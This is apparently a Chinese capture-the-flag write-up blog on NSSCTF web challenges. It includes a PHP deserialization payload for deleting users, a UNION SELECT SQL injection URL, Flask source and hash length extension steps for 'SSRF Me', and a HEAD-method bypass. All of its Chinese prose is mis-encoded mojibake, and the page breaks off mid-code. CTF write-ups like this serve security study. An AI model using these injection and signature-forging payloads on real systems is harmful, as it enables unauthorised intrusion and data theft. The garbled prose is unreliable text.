è¿™é‡Œ$idæˆä¸ºä¸€ä¸ªæœªè¢«åˆå§‹åŒ–çš„å˜é‡ï¼Œç„¶åå°±å¯ä»¥è¢«ä»»æ„è¦†ç›–ã€‚åœ¨common.phpä¸­è¿›è¡Œå˜é‡è¦†ç›–ã€‚</p><p>åœ¨api.phpä¸­ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦åˆ é™¤ç”¨æˆ·ï¼Œæ˜¯éœ€è¦check&#x3D;&#x3D;&#x3D;1çš„ï¼Œé‡Œé¢å­˜åœ¨ä¸€ä¸ªè€ƒç‚¹ï¼šhashé•¿åº¦æ‹“å±•æ”»å‡»ã€‚</p><p>æˆ‘ä»¬å…ˆè·å–ä¸€ä¸‹useridï¼Œå¾…ä¼šè¦åˆ é™¤çš„userid</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104115507603.png" alt="image-20250104115507603" style="zoom:80%;" /><p>useridä¸º2</p><p>ç„¶åå»æ„é€ apiçš„payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;role&#x27;</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><p>åªæœ‰adminç”¨æˆ·æ‰èƒ½åˆ é™¤ç”¨æˆ·ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ„é€ å¦‚ä¸‹payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$check</span>=<span class="string">&quot;f94ecd6b9856b048313eeb7d0179cb32&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$data</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$method</span>=<span class="string">&quot;del_user&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$userid</span>=<span class="string">&quot;2&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">admin</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜saltç›´æ¥å‘Šè¯‰æˆ‘ä»¬äº†ï¼Œæˆ‘ä»¬å°±ä¸éœ€è¦hashé•¿åº¦æ‹“å±•æ”»å‡»äº†ã€‚ã€‚ã€‚</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104115941234.png" alt="image-20250104115941234"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiJmOTRlY2Q2Yjk4NTZiMDQ4MzEzZWViN2QwMTc5Y2IzMiI7czo0OiJkYXRhIjtzOjE6IjEiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9</span><br></pre></td></tr></table></figure><p>ç„¶åå»api.phpåˆ é™¤ç”¨æˆ·ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬å‘ç°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] === <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/web/riji.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä»¬éœ€è¦ä¿æŒç™»é™†çŠ¶æ€ï¼Œé‚£ä¹ˆæ¢ä¸ªæµè§ˆå™¨ã€‚ã€‚</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104120856200.png" alt="image-20250104120856200"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28105/api.php?api=Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiJmOTRlY2Q2Yjk4NTZiMDQ4MzEzZWViN2QwMTc5Y2IzMiI7czo0OiJkYXRhIjtzOjE6IjEiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9</span><br></pre></td></tr></table></figure><p>useråˆ é™¤æˆåŠŸï¼</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104120932581.png" alt="image-20250104120932581"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28105/riji.php?id=-1%20union%20select%201,2,(select%20flag%20from%20flag)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104120944656.png" alt="image-20250104120944656"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;bea1ea82-0c83-4722-8a89-a41b35a5c119&#125;</span><br></pre></td></tr></table></figure><h2 id="De1ctf-2019-SSRF-Me"><a href="#De1ctf-2019-SSRF-Me" class="headerlink" title="[De1ctf 2019]SSRF Me"></a>[De1ctf 2019]SSRF Me</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        <span class="variable language_">self</span>.action = action</span><br><span class="line">        <span class="variable language_">self</span>.param = param</span><br><span class="line">        <span class="variable language_">self</span>.sign = sign</span><br><span class="line">        <span class="variable language_">self</span>.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(<span class="variable language_">self</span>.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(<span class="variable language_">self</span>.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">self</span>.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="variable language_">self</span>.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(<span class="variable language_">self</span>.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="variable language_">self</span>.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (getSign(<span class="variable language_">self</span>.action, <span class="variable language_">self</span>.param) == <span class="variable language_">self</span>.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…ˆç†ä¸€ä¸‹æ€è·¯ï¼šæœ€ç»ˆçš„flagåº”è¯¥æ˜¯åœ¨result.txtä¸­çš„ï¼Œé‚£ä¹ˆå°±éœ€è¦è§¦å‘Taskç±»çš„Execæ–¹æ³•ï¼Œåœ¨&#x2F;De1taè·¯ç”±ä¸‹å¯ä»¥å®ç°ï¼ŒåŒæ—¶actionã€paramã€signå¯æ§ã€‚Execæ–¹æ³•ä¸­æœ‰ä¸€ä¸ªchecksignæ–¹æ³•ï¼Œè¿™å…¶å®å°±è€ƒå¯Ÿåˆ°hashé•¿åº¦æ‹“å±•æ”»å‡»äº†ã€‚getsignå¯ä»¥è·å–åˆ°ä¸€ä¸ªå·²çŸ¥çš„hashå€¼ã€‚</p><p>æˆ‘ä»¬è®¿é—®&#x2F;geneSignè·¯ç”±å¯ä»¥è·å–ä¸€ä¸ªhashå€¼ï¼Œsecert_key+scançš„å“ˆå¸Œå€¼ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">checkSign</span>(<span class="built_in">self</span>):</span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">getSign</span>(<span class="built_in">self</span>.action, <span class="built_in">self</span>.param) == <span class="built_in">self</span>.sign):</span><br><span class="line">           <span class="keyword">return</span> True</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="keyword">return</span> False</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">task = <span class="title function_ invoke__">Task</span>(action, param, sign, ip)</span><br><span class="line"><span class="keyword">return</span> json.<span class="title function_ invoke__">dumps</span>(task.<span class="title function_ invoke__">Exec</span>())</span><br></pre></td></tr></table></figure><p>é¢˜ç›®ç»™äº†æç¤º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag is in ./flag.txt</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥çš„æ€è·¯æ˜¯åˆ©ç”¨scanå°†flag.txtå†™å…¥result.txtï¼ŒåŒæ—¶ä¼šprint flag.txtçš„å†…å®¹ï¼Œæˆ‘ä»¬å…ˆæ„é€ è¿™ä¸ªã€‚</p><p>é¦–å…ˆè®¿é—®&#x2F;geneSignè·¯ç”±ï¼Œè·å–secret_key+flag.txt+scançš„hashå€¼a95501825b9d23020a8f670b281649fa</p><p>ç„¶ååœ¨&#x2F;De1taè·¯ç”±ä¸‹æ„é€ actionä¸ºscanï¼Œparamä¸ºflag.txtï¼Œsignä¸ºa95501825b9d23020a8f670b281649faã€‚</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104221216421.png" alt="image-20250104221216421"></p><p>åªprintäº†ä¸€ä¸ªçŠ¶æ€ç ã€‚ã€‚ã€‚çªç„¶æƒ³èµ·æ¥è¦print resp.textæ‰è¡Œã€‚ã€‚é‚£ä¹ˆå°±éœ€è¦readäº†ï¼Œä½†æ˜¯æˆ‘ä»¬èƒ½è·å–çš„hashå€¼å¿…å®šå¸¦æœ‰scanã€‚è¿™æ—¶æˆ‘ä»¬çªç„¶æ³¨æ„åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if &quot;read&quot; in self.action:</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ actionä¸ºscanread</p><p>secret_key+flag.txt+scançš„hashå€¼æ˜¯å·²çŸ¥çš„ã€‚</p><p>åœ¨&#x2F;De1taè·¯ç”±ä¸‹æ„é€ actionä¸ºscanxxxxxxxreadï¼Œparamä¸ºflag.txtï¼Œè¿›è¡Œå“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»ã€‚</p><p>signature:a95501825b9d23020a8f670b281649fa</p><p>data:scan</p><p>key length:24</p><p>data to add:read</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104223600499.png" alt="image-20250104223600499"></p><p>2d970424e20612e377913e4a9ea324af</p><p>scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read</p><p>åœ¨&#x2F;De1taè·¯ç”±ä¸‹æ„é€ actionä¸ºscan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read</p><p>paramä¸ºflag.txtï¼Œsignä¸º2d970424e20612e377913e4a9ea324af</p><p>å‘ç°ä¸è¡Œã€‚ã€‚ã€‚</p><p>é‡æ–°æ‹ä¸€ä¸‹æ€è·¯ï¼š</p><p>æœ‰readï¼Œæœ‰scanå°±å¯ä»¥</p><p>è®¿é—®&#x2F;geneSignè·¯ç”±ï¼Œparamä¸ºflag.txtread</p><p>é‚£ä¹ˆè·å–secret_key+flag.txt+readscançš„hashå€¼523423f97fa7df58aec22413b39fd8f2</p><p>åœ¨&#x2F;De1taè·¯ç”±ä¸‹æ„é€ actionä¸ºreadscanï¼Œparamä¸ºflag.txtä¸å°±å¥½äº†ã€‚ã€‚ã€‚</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104224546154.png" alt="image-20250104224546154"></p><p>ç›´æ¥å‡ºäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;2ef1cb7c-7d09-49ed-abe6-451e0b4bf48e&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å†å›é¡¾ä¸€ä¸‹hashé•¿åº¦æ‹“å±•æ”»å‡»ï¼Œè¿˜æ˜¯å¾—å­¦ã€‚</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104225223289.png" alt="image-20250104225223289"></p><p>æˆåŠŸäº†ï¼Œå¯†é’¥24ä½ï¼Œæœ‰ç‚¹ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">len(secert_key) = 16</span><br><span class="line">16 + len(&#x27;scan&#x27;) + len(&#x27;read&#x27;) = 24 = Key Length</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104225321393.png" alt="image-20250104225321393"></p><h2 id="prize-p4"><a href="#prize-p4" class="headerlink" title="prize_p4"></a>prize_p4</h2><p>è¿™é“é¢˜è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œæˆ‘å¡åœ¨äº†ä¸€ä¸ªç‚¹ä¸Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/getkey&#x27;, methods=[&quot;GET&quot;]) </span><br><span class="line"></span><br><span class="line">def getkey(): </span><br><span class="line">if request.method != &quot;GET&quot;: </span><br><span class="line">session[&quot;key&quot;]=SECRET_KEY</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥ç”¨ä¸GETç›¸ä¼¼çš„æ–¹æ³•HEADæ¥ç»•è¿‡ã€‚</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105082600584.png" alt="image-20250105082600584"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, url_for,redirect,render_template_string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> flag </span><br><span class="line"></span><br><span class="line">SECRET_KEY=<span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.update(<span class="built_in">dict</span>(</span><br><span class="line">    SECRET_KEY=SECRET_KEY,</span><br><span class="line">))</span><br><span class="line"></span><br><span class="line"><span class="comment">#src in /app</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_data&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">    data = request.form.get(<span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(data) <span class="keyword">is</span> <span class="built_in">str</span>:</span><br><span class="line">        data=data.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    url = request.form.get(<span class="string">&#x27;url&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8888/&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">and</span> url:</span><br><span class="line">        session[<span class="string">&#x27;data&#x27;</span>] = data</span><br><span class="line">        session[<span class="string">&#x27;url&#x27;</span>] = url</span><br><span class="line">        session[<span class="string">&quot;admin&quot;</span>]=<span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;home&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;/&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/home&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;admin&quot;</span>,<span class="literal">False</span>):</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="built_in">open</span>(__file__).read())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;home.html&quot;</span>,data=session.get(<span class="string">&#x27;data&#x27;</span>,<span class="string">&#x27;Not find data...&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getkey&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getkey</span>():</span><br><span class="line">    <span 